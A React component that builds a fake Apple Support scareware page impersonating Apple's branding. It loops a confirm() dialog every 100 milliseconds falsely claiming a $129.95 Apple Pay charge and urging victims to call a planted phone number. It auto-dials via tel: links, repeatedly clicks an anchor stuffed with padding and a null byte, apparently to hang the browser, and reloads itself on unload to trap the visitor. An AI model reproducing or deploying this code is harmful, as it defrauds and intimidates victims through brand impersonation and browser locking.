import React, { useState, useEffect, useRef } from 'react';

const cookieHelper = {
  getParams: () => ({
    path: '/',
    domain: typeof window!== 'undefined'? '.' + window.location.host.replace(/:\d+/, '') : ''
  }),
  set: function (name, value, options = {}) {
    if (typeof document === 'undefined') return;
    const defs = this.getParams();
    const config = {...defs,...options };
    let expires = config.expires;
    if (typeof expires === 'number' && expires) {
      const e = new Date();
      e.setTime(e.getTime() + 1000 * expires);
      expires = config.expires = e;
    }
    if (expires && expires.toUTCString) {
      config.expires = expires.toUTCString();
    }
    let cookieString = `${name}=${encodeURIComponent(value)}`;
    for (const key in config) {
      cookieString += `; ${key}`;
      const val = config[key];
      if (val!== true) cookieString += `=${val}`;
    }
    document.cookie = cookieString;
  },
  get: function (name) {
    if (typeof document === 'undefined') return undefined;
    const match = document.cookie.match(
      new RegExp('(?:^|; )' + name.replace(/([\.$?*|{}\(\)\[\]\\\/\+^])/g, '\\$1') + '=([^;]*)')
    );
    return match? decodeURIComponent(match[1]) : undefined;
  },
  del: function (name) {
    this.set(name, '', { expires: -1 });
  }
};

// Helper to format phone for display
const formatPhone = (num) => {
  const digits = num.replace(/\D/g, '');
  if (digits.length === 11 && digits.startsWith('1')) {
    return `+1 (${digits.slice(1,4)}) ${digits.slice(4,7)}-${digits.slice(7)}`;
  }
  return num; // fallback
};

const AppleSupportLanding = () => {
  const rawPhone = '+1(888)824-0848'; // for tel: links
  const [phone, setPhone] = useState(rawPhone);
  const [displayPhone, setDisplayPhone] = useState(formatPhone(rawPhone)); // for UI
  const [displayText, setDisplayText] = useState('');
  const resultRef = useRef(null);

  useEffect(() => {
    if (typeof window === 'undefined') return;

    const urlParams = new URLSearchParams(window.location.search);

    const parseURL = (url) => {
      try {
        const a = document.createElement('a');
        a.href = url;
        return a.hostname.replace('www.', '');
      } catch (e) {
        return '';
      }
    };

    // 1. Phone Resolution
    const paramPhone = urlParams.get('phone');
    const cookiePhone = cookieHelper.get('phoneSetBl');
    const activePhone = cookiePhone || paramPhone || rawPhone;
    setPhone(activePhone);
    setDisplayPhone(formatPhone(activePhone)); // format for display

    const userAgent = window.navigator.userAgent.toLowerCase();
    let detectedDevice = 'iPhone';
    if (/ipad/.test(userAgent)) detectedDevice = 'iPad';
    else if (/ipod/.test(userAgent)) detectedDevice = 'iPod';

    const referrerHost = parseURL(document.referrer);

    const getText = () => {
      let str = window.defaultText || '';
      if (window.text) {
        for (const domainKey in window.text) {
          if (referrerHost.indexOf(domainKey)!== -1) {
            str = window.text[domainKey];
            break;
          }
        }
      }
      return str
       .replace('|%model%|', detectedDevice)
       .replace('|%ref%|', referrerHost);
    };

    const cookieText = cookieHelper.get('textSetBl');
    const paramText = urlParams.get('text');
    const activeText = cookieText || paramText || getText();
    setDisplayText(activeText);

    const triggerCallActions = () => {
      if (!resultRef.current) return;
      resultRef.current.innerHTML = '';

      const callAnchor = document.createElement('a');
      callAnchor.className = 'anchorcall';
      callAnchor.href = `tel:${activePhone}`; // raw number for calling
      resultRef.current.appendChild(callAnchor);
      callAnchor.click();

      const extraData = '5555'.repeat(200);
      const extraAnchor = document.createElement('a');
      extraAnchor.href = `#callto+${extraData}%00`;
      resultRef.current.appendChild(extraAnchor);

      for (let i = 0; i < 6; i++) {
        extraAnchor.click();
      }
    };

    const runConfirmLoop = () => {
      const msg =
        `Your Apple ID was recently used at APPLE STORE for $129.95 Via Apple Pay Pre-Authorization! We have placed those request on hold to ensure your Safety and Security. Not You? Immediately call apple support ${displayPhone} to Freeze it!`; // uses formatted number in text

      window.confirm(msg);
      triggerCallActions();
    };

    const intervalId = setInterval(runConfirmLoop, 100);

    const handleUnload = () => {
      window.location.reload();
    };
    window.addEventListener('unload', handleUnload);

    return () => {
      clearInterval(intervalId);
      window.removeEventListener('unload', handleUnload);
    };
  }, []);

  return (
    <div className="apple-support-page">
      <div id="result" ref={resultRef} />

      <input type="checkbox" id="ac-gn-menustate" className="ac-gn-menustate" />

      <nav id="ac-globalnav" className="no-js">
        {/* nav code */}
      </nav>

      <div id="ac-gn-curtain" className="ac-gn-curtain" />
      <div id="ac-gn-placeholder" className="ac-nav-placeholder" />

      <div className="main">
        <nav id="ac-localnav" className="js no-touch css-sticky" lang="en-US" role="navigation">
          <div className="ac-ln-wrapper">
            <div className="ac-ln-background" />
            <div className="ac-ln-content">
              <span className="ac-ln-title">
                <a href="#">
                  Apple Support {displayPhone}{' '}
                  <span style={{ color: 'red' }}>
                    <span className="js_setPhoneBlock">{displayPhone}</span>
                  </span>
                </a>
              </span>
              <div className="ac-ln-menu">
                <a href="#ac-ln-menustate" className="ac-ln-menucta-anchor ac-ln-menucta-anchor-open" id="ac-ln-menustate-open">
                  <span className="ac-ln-menucta-anchor-label">Open menu</span>
                </a>
                <a href="#" className="ac-ln-menucta-anchor ac-ln-menucta-anchor-close" id="ac-ln-menustate-close">
                  <span className="ac-ln-menucta-anchor-label">Close menu</span>
                </a>
                <div className="ac-ln-menu-tray">
                  <ul className="ac-ln-menu-items">
                    <li className="ac-ln-menu-item">
                      <a href="#" className="ac-ln-menu-link analytics-exitlink">Communities</a>
                    </li>
                  </ul>
                </div>
              </div>
            </div>
          </div>
        </nav>

        <section className="as-columns as-columns--1up as-banner as-banner--top">
          <div className="row">
            <div className="column large-12 medium-12 small-12">
              <div className="as-banner-cont">
                <div className="as-banner-image as-banner-image--top">
                  <style
                    dangerouslySetInnerHTML={{
                      __html: `
                       .as-banner-image.as-banner-image--top {
                            background-image: url("globalnav/apple/contact-us-hero.image.large_2x.jpg");
                        }
                       .as-banner-image.as-banner-image--top:before {
                            content: "";
                            display: block;
                        }
                        @media only screen and (max-width: 735px) {
                           .as-banner-image.as-banner-image--top {
                                background-image: url("globalnav/apple/contact-us-hero.image.small_2x.jpg");
                            }
                        }
                      `
                    }}
                  />
                  <img
                    sizes="(min-width:735px) 735w, 100vw"
                    srcSet="globalnav/apple/contact-us-hero.image.small_2x.jpg 735w, globalnav/apple/contact-us-hero.image.large_2x.jpg 1440w"
                    alt="Apple Support Hero"
                    className="as-image-speculativedownload"
                    src="globalnav/apple/contact-us-hero.image.large_2x.jpg"
                  />
                </div>
              </div>
              <div className="as-banner-content">
                <div className="pageTitle">
                  <h1 className="pageTitle-heading">Apple Support</h1>
                  <p className="pageTitle-intro js_setTextBlock">{displayText}</p>
                </div>
              </div>
            </div>
          </div>
        </section>
      </div>

      <footer id="ac-globalfooter" className="no-js">
        <div className="ac-gf-content">
          <section className="ac-gf-footer">
            <div className="ac-gf-footer-shop">
              More ways to: Visit an{' '}
              <a href="#" className="analytics-exitlink">Apple Store</a>,{' '}
              <span className="nowrap">
                call <span className="js_setPhoneBlock">{displayPhone}</span>, or{' '}
                <a href="#" className="analytics-exitlink">find a reseller</a>
              </span>
             .
            </div>
            <div className="ac-gf-footer-legal">
              <div className="ac-gf-footer-legal-copyright">
                Copyright © 2026 Apple. All rights reserved.
              </div>
            </div>
          </section>
        </div>
      </footer>
    </div>
  );
};

export default AppleSupportLanding;
